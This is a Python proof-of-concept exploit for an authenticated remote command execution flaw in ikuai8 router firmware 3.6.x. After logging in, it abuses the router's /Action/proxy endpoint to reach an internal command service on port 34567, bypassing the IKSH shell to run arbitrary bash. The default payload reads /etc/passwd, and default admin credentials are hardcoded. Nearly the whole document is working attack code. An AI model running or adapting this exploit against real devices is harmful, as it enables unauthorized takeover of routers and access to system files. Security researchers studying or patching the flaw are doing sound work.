'''
Description: ikuai8_3.6.x RCE vulnerability after login.
Author: eqqie
Other: Bypass IKSH to execute arbitrary BASH commands.
''' 

import requests
import base64
import hashlib
import json
import sys

host = "192.168.10.1"
username = "admin"
password = "qwe123!@#"
command = "cat /etc/passwd"

login_form = {"username": "", "passwd": "",
              "pass": "", "remember_password": "true"}


def main(host, user, passwd, cmd):
    login_form["username"] = user
    login_form["passwd"] = hashlib.md5(passwd.encode()).hexdigest()
    login_form["pass"] = base64.b64encode(
        b"salt_11"+password.encode()).decode()
    session = requests.Session()
    print(f"[*] Login with '{user}:{passwd}'\n")
    res = session.post(
        url=f"http://{host}/Action/login",
        data=json.dumps(login_form),
        timeout=(3, 3)
    )
    if res.json()["Result"] != 10000:
        raise ValueError("Login fail!")
    print("[*] Run command:", cmd, "\n")
    res = session.post(
        url=f"http://{host}/Action/proxy?http://127.0.0.1:34567/command/file",
        data=cmd,
        timeout=(3, 3)
    )
    print("[*] Exec result:\n")
    print(res.text)


if __name__ == "__main__":
    if len(sys.argv) != 5:
        main(host, username, password, command)
    else:
        main(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])
